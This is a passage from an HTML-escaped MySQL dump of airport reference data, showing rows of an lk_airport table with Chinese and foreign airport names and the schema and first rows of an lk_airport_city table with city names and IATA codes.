`lk_airport` VALUES (&#39;1203&#39;, &#39;九江庐山机场&#39;, &#39;84&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1204&#39;, &#39;西昌青山机场&#39;, &#39;176&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1205&#39;, &#39;榆林西沙机场&#39;, &#39;186&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1206&#39;, &#39;艾塞尼亚机场&#39;, &#39;382&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1207&#39;, &#39;扬州泰州机场&#39;, &#39;196&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1208&#39;, &#39;泸州蓝田机场&#39;, &#39;115&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1209&#39;, &#39;卢克索机场&#39;, &#39;411&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1210&#39;, &#39;札幌机场&#39;, &#39;322&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1211&#39;, &#39;南充高坪机场&#39;, &#39;123&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1212&#39;, &#39;大理荒草坝机场&#39;, &#39;40&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1213&#39;, &#39;湖南永州零陵机场&#39;, &#39;185&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1214&#39;, &#39;黄山屯溪机场&#39;, &#39;78&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1215&#39;, &#39;呼伦贝尔满洲里西郊机场&#39;, &#39;120&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1216&#39;, &#39;衢州机场&#39;, &#39;135&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1217&#39;, &#39;唐山三女河机场&#39;, &#39;158&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1218&#39;, &#39;巴厘&#39;, &#39;309&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1219&#39;, &#39;乌兰浩特机场&#39;, &#39;160&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1220&#39;, &#39;贵州黎平机场&#39;, &#39;101&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1221&#39;, &#39;常德桃花源(斗姆湖)机场&#39;, &#39;22&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1222&#39;, &#39;格尔木机场&#39;, &#39;56&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1223&#39;, &#39;济州机场&#39;, &#39;321&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1224&#39;, &#39;恩施机场&#39;, &#39;48&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1225&#39;, &#39;阜阳西关机场&#39;, &#39;51&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1226&#39;, &#39;淮安涟水机场&#39;, &#39;71&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1227&#39;, &#39;景德镇罗家机场&#39;, &#39;79&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1228&#39;, &#39;二连浩特赛乌苏国际机场&#39;, &#39;49&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1229&#39;, &#39;林芝机场&#39;, &#39;116&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1230&#39;, &#39;通辽机场&#39;, &#39;153&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1231&#39;, &#39;巴厘岛&#39;, &#39;309&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1232&#39;, &#39;怀化芷江机场&#39;, &#39;72&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1233&#39;, &#39;河北邯郸机场机场&#39;, &#39;66&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1234&#39;, &#39;运城关公机场&#39;, &#39;188&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1235&#39;, &#39;巴彦淖尔天吉泰机场&#39;, &#39;18&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1236&#39;, &#39;敦煌机场&#39;, &#39;41&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1237&#39;, &#39;鸡西兴凯湖机场&#39;, &#39;89&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1238&#39;, &#39;克拉玛依机场&#39;, &#39;100&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1239&#39;, &#39;荆州沙市机场&#39;, &#39;143&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1240&#39;, &#39;茨城机场&#39;, &#39;326&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1241&#39;, &#39;中卫(香山、沙坡头)机场&#39;, &#39;205&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1242&#39;, &#39;汉中西关机场&#39;, &#39;77&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1243&#39;, &#39;青海玉树三江源(巴塘)机场&#39;, &#39;197&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1244&#39;, &#39;重庆万州五桥机场&#39;, &#39;171&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1245&#39;, &#39;锡林浩特机场&#39;, &#39;177&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1246&#39;, &#39;安庆(天柱山）机场&#39;, &#39;5&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1247&#39;, &#39;济宁机场&#39;, &#39;87&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1248&#39;, &#39;霍巴特机场&#39;, &#39;424&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1249&#39;, &#39;赤峰玉龙机场&#39;, &#39;25&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1250&#39;, &#39;黑河机场&#39;, &#39;67&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1251&#39;, &#39;长白山机场&#39;, &#39;33&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1252&#39;, &#39;塞班机场&#39;, &#39;371&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1253&#39;, &#39;和田机场&#39;, &#39;76&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1254&#39;, &#39;腾冲（驼峰）机场&#39;, &#39;151&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1255&#39;, &#39;漠河古莲机场&#39;, &#39;121&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1256&#39;, &#39;长治王村机场&#39;, &#39;26&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1257&#39;, &#39;通化机场&#39;, &#39;156&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1258&#39;, &#39;库车机场&#39;, &#39;93&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1259&#39;, &#39;金昌机场&#39;, &#39;83&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1260&#39;, &#39;舟山普陀山朱家尖机场&#39;, &#39;200&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1261&#39;, &#39;井冈山机场&#39;, &#39;82&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1262&#39;, &#39;甘肃天水机场&#39;, &#39;154&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1263&#39;, &#39;云南文山普者黑机场&#39;, &#39;164&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1264&#39;, &#39;临沧机场&#39;, &#39;108&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1265&#39;, &#39;庆阳机场&#39;, &#39;133&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1266&#39;, &#39;昭通机场&#39;, &#39;202&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1267&#39;, &#39;广元机场&#39;, &#39;57&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1268&#39;, &#39;伊春林都机场&#39;, &#39;184&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1269&#39;, &#39;吐鲁番交河机场&#39;, &#39;155&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1270&#39;, &#39;康定机场&#39;, &#39;94&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1271&#39;, &#39;铜仁凤凰机场&#39;, &#39;152&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1272&#39;, &#39;广汉机场&#39;, &#39;55&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1273&#39;, &#39;鞍山机场&#39;, &#39;4&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1274&#39;, &#39;福建龙岩冠豸山机场&#39;, &#39;102&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1275&#39;, &#39;扬&#39;, &#39;196&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1276&#39;, &#39;安康机场&#39;, &#39;2&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1277&#39;, &#39;贵州安顺黄果树机场&#39;, &#39;6&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1278&#39;, &#39;普洱(思茅)机场&#39;, &#39;131&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1279&#39;, &#39;且末机场&#39;, &#39;132&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1280&#39;, &#39;迪庆香格里拉机场&#39;, &#39;38&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1281&#39;, &#39;九寨沟黄龙(九黄）机场&#39;, &#39;90&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1282&#39;, &#39;阿勒泰机场&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1283&#39;, &#39;广西梧州长洲岛机场&#39;, &#39;170&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1284&#39;, &#39;辽宁朝阳机场&#39;, &#39;24&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1285&#39;, &#39;西藏昌都邦达机场&#39;, &#39;21&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1286&#39;, &#39;延安二十里铺机场&#39;, &#39;182&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1287&#39;, &#39;阿勒&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1288&#39;, &#39;张掖机场&#39;, &#39;201&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1289&#39;, &#39;新疆博乐机场&#39;, &#39;15&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1290&#39;, &#39;日喀则和平机场&#39;, &#39;139&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1291&#39;, &#39;宁夏固原六盘山机场&#39;, &#39;58&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1292&#39;, &#39;乌海机场&#39;, &#39;166&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1293&#39;, &#39;保山云瑞机场&#39;, &#39;16&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1294&#39;, &#39;那拉提机场&#39;, &#39;126&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1295&#39;, &#39;长海（大长山岛）机场&#39;, &#39;28&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1296&#39;, &#39;东营永安机场&#39;, &#39;42&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1297&#39;, &#39;荔波机场&#39;, &#39;106&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1298&#39;, &#39;广西百色(田阳)机场&#39;, &#39;11&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1299&#39;, &#39;达尼丁&#39;, &#39;426&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1300&#39;, &#39;黔江舟白机场&#39;, &#39;134&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1301&#39;, &#39;塔城机场&#39;, &#39;150&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1302&#39;, &#39;阿里昆莎机场&#39;, &#39;8&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1303&#39;, &#39;黎&#39;, &#39;101&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1304&#39;, &#39;苏&#39;, &#39;339&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1305&#39;, &#39;帕&#39;, &#39;423&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1306&#39;, &#39;新疆喀纳斯机场&#39;, &#39;97&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1307&#39;, &#39;阿尔山伊尔施机场&#39;, &#39;10&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1308&#39;, &#39;兴义机场&#39;, &#39;172&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1309&#39;, &#39;蒙特利尔机场&#39;, &#39;369&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1310&#39;, &#39;温哥华机场&#39;, &#39;360&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1311&#39;, &#39;华盛顿&#39;, &#39;364&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1312&#39;, &#39;圣保罗&#39;, &#39;375&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1313&#39;, &#39;北海&#39;, &#39;14&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1314&#39;, &#39;罗马&#39;, &#39;331&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1315&#39;, &#39;华盛顿&#39;, &#39;364&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1316&#39;, &#39;巴黎&#39;, &#39;328&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1317&#39;, &#39;珀斯&#39;, &#39;417&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1318&#39;, &#39;波特兰&#39;, &#39;383&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1319&#39;, &#39;卡萨布兰卡&#39;, &#39;399&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1320&#39;, &#39;华盛顿&#39;, &#39;364&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1321&#39;, &#39;芝加哥&#39;, &#39;361&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1322&#39;, &#39;奥克兰&#39;, &#39;414&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1323&#39;, &#39;底特律&#39;, &#39;366&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1324&#39;, &#39;雅典&#39;, &#39;345&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1325&#39;, &#39;圣保罗&#39;, &#39;375&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1326&#39;, &#39;纽卡斯尔&#39;, &#39;348&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1327&#39;, &#39;哥本哈根&#39;, &#39;341&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1328&#39;, &#39;东京&#39;, &#39;300&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1329&#39;, &#39;伦敦&#39;, &#39;327&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1330&#39;, &#39;斯德哥尔摩&#39;, &#39;335&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1331&#39;, &#39;罗马&#39;, &#39;331&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1332&#39;, &#39;名古屋&#39;, &#39;310&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1333&#39;, &#39;布宜诺斯艾利斯&#39;, &#39;386&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1334&#39;, &#39;格拉斯哥&#39;, &#39;351&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1335&#39;, &#39;格拉斯哥&#39;, &#39;351&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1336&#39;, &#39;曼彻斯特&#39;, &#39;337&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1337&#39;, &#39;波特兰&#39;, &#39;383&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1338&#39;, &#39;首尔&#39;, &#39;301&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1339&#39;, &#39;首尔&#39;, &#39;301&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1340&#39;, &#39;斯德哥尔摩&#39;, &#39;335&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1341&#39;, &#39;米兰&#39;, &#39;333&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1342&#39;, &#39;巴黎&#39;, &#39;328&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1343&#39;, &#39;伦敦&#39;, &#39;327&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1344&#39;, &#39;布宜诺斯艾利斯&#39;, &#39;386&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1345&#39;, &#39;伦敦&#39;, &#39;327&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1346&#39;, &#39;华盛顿&#39;, &#39;364&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1347&#39;, &#39;柏林&#39;, &#39;336&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1348&#39;, &#39;巴厘岛&#39;, &#39;309&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1349&#39;, &#39;圣保罗&#39;, &#39;375&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1350&#39;, &#39;米兰&#39;, &#39;333&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1351&#39;, &#39;多伦多&#39;, &#39;362&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1352&#39;, &#39;斯德哥尔摩&#39;, &#39;335&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1353&#39;, &#39;罗马&#39;, &#39;331&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1354&#39;, &#39;雅典&#39;, &#39;345&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1355&#39;, &#39;吉隆坡苏丹阿卜杜尔机场&#39;, &#39;304&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1356&#39;, &#39;CALGARY机场&#39;, &#39;379&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1357&#39;, &#39;米兰利纳特机场&#39;, &#39;333&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1358&#39;, &#39;柏林勃兰登堡机场&#39;, &#39;336&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1359&#39;, &#39;底特律都会韦恩县机场&#39;, &#39;366&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1360&#39;, &#39;赫登机场&#39;, &#39;382&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1361&#39;, &#39;斯德哥尔摩史卡夫斯塔机场&#39;, &#39;335&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1362&#39;, &#39;华盛顿杜勒斯机场&#39;, &#39;364&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1363&#39;, &#39;巴黎－奥利机场&#39;, &#39;328&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1364&#39;, &#39;Hamburg Finkenwerder机场&#39;, &#39;354&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1365&#39;, &#39;法兰克福哈恩机场&#39;, &#39;329&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1366&#39;, &#39;普雷斯蒂克机场&#39;, &#39;351&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1367&#39;, &#39;加州奥克兰机场&#39;, &#39;414&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1368&#39;, &#39;罗纳德・里根机场&#39;, &#39;364&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1369&#39;, &#39;芝加哥中途机场&#39;, &#39;361&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1370&#39;, &#39;盖特威克机场&#39;, &#39;327&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1371&#39;, &#39;萨比哈・格克琴机场&#39;, &#39;323&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1372&#39;, &#39;北九州机场&#39;, &#39;318&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1373&#39;, &#39;莫斯科机场&#39;, &#39;330&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1374&#39;, &#39;巴黎机场&#39;, &#39;328&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1375&#39;, &#39;罗马机场&#39;, &#39;331&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1376&#39;, &#39;墨尔本机场&#39;, &#39;413&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1377&#39;, &#39;悉尼金斯福德・史密斯机场&#39;, &#39;412&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1378&#39;, &#39;多伦多市中心机场&#39;, &#39;362&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1379&#39;, &#39;多伦多皮尔逊机场&#39;, &#39;362&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1380&#39;, &#39;伏努科沃机场&#39;, &#39;330&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1381&#39;, &#39;多莫杰多沃机场&#39;, &#39;330&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1382&#39;, &#39;滕伯尔霍夫机场&#39;, &#39;336&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1383&#39;, &#39;埃塞萨皮斯塔里尼部长机场&#39;, &#39;386&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1384&#39;, &#39;伦敦卢顿机场&#39;, &#39;327&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1385&#39;, &#39;波里斯珀尔机场&#39;, &#39;352&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1386&#39;, &#39;伦敦城市机场&#39;, &#39;327&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1387&#39;, &#39;埃德蒙顿机场&#39;, &#39;385&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1388&#39;, &#39;威廉斯敦机场&#39;, &#39;348&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1389&#39;, &#39;米拉贝尔机场&#39;, &#39;369&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1390&#39;, &#39;桃园/桃園(原中正)机场&#39;, &#39;211&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1391&#39;, &#39;奥兰多桑福德机场&#39;, &#39;382&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1392&#39;, &#39;伯明翰舒特尔斯沃思机场&#39;, &#39;347&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1393&#39;, &#39;舍讷费尔德机场&#39;, &#39;336&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1394&#39;, &#39;波音场国王郡立机场&#39;, &#39;363&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1395&#39;, &#39;雅加达机场&#39;, &#39;306&#39;, &#39;1&#39;); INSERT INTO `lk_airport` VALUES (&#39;1396&#39;, &#39;伦敦斯坦斯特德机场&#39;, &#39;327&#39;, &#39;1&#39;); -- ---------------------------- -- Table structure for lk_airport_city -- ---------------------------- DROP TABLE IF EXISTS `lk_airport_city`; CREATE TABLE `lk_airport_city` ( `city_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT, `city_name` varchar(10) NOT NULL DEFAULT &#39;&#39;, `initial` char(1) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;首字母&#39;, `airport_code` varchar(5) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;机场代码&#39;, `is_hot` tinyint(3) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;是否热门 1是 0否&#39;, `is_inter__hot` tinyint(3) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;是否国外热门 1是 0否&#39;, PRIMARY KEY (`city_id`) ) ENGINE=MyISAM AUTO_INCREMENT=209 DEFAULT CHARSET=utf8mb4 ROW_FORMAT=DYNAMIC; -- ---------------------------- -- Records of lk_airport_city -- ---------------------------- INSERT INTO `lk_airport_city` VALUES (&#39;24&#39;, &#39;朝阳&#39;, &#39;C&#39;, &#39;CHG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;182&#39;, &#39;延安&#39;, &#39;Y&#39;, &#39;ENY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;165&#39;, &#39;温州&#39;, &#39;W&#39;, &#39;WNZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;36&#39;, &#39;稻城&#39;, &#39;D&#39;, &#39;DCY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;111&#39;, &#39;洛阳&#39;, &#39;L&#39;, &#39;LYA&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;201&#39;, &#39;张掖&#39;, &#39;Z&#39;, &#39;YZY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;128&#39;, &#39;南阳&#39;, &#39;N&#39;, &#39;NNY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;136&#39;, &#39;齐齐哈尔&#39;, &#39;Q&#39;, &#39;NDG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;114&#39;, &#39;柳州&#39;, &#39;L&#39;, &#39;LZH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;105&#39;, &#39;丽江&#39;, &#39;L&#39;, &#39;LJG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;100&#39;, &#39;克拉玛依&#39;, &#39;K&#39;, &#39;KRY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;14&#39;, &#39;北海&#39;, &#39;B&#39;, &#39;BHY&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;192&#39;, &#39;义乌&#39;, &#39;Y&#39;, &#39;YIW&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;123&#39;, &#39;南充&#39;, &#39;N&#39;, &#39;NAO&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;96&#39;, &#39;凯里&#39;, &#39;K&#39;, &#39;KJH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;121&#39;, &#39;漠河&#39;, &#39;M&#39;, &#39;OHE&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;38&#39;, &#39;迪庆&#39;, &#39;D&#39;, &#39;DIG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;207&#39;, &#39;珠海&#39;, &#39;Z&#39;, &#39;ZUH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES 